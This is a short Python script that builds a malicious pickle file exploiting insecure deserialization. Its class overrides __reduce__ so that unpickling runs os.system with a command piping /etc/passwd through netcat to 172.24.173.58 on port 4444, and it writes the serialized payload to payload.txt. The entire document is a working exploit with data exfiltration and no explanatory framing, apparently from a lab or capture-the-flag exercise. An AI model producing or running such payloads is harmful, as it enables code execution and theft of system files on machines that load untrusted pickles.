#!/usr/bin/python3

import pickle
import os

command = 'cat /etc/passwd | nc 172.24.173.58 4444'
class PAYLOAD():
    def __reduce__(self):
        return os.system, ("{}".format(command),)
payload = pickle.dumps(PAYLOAD(), protocol=0)
file = open('payload.txt', 'wb')
file.write(payload)
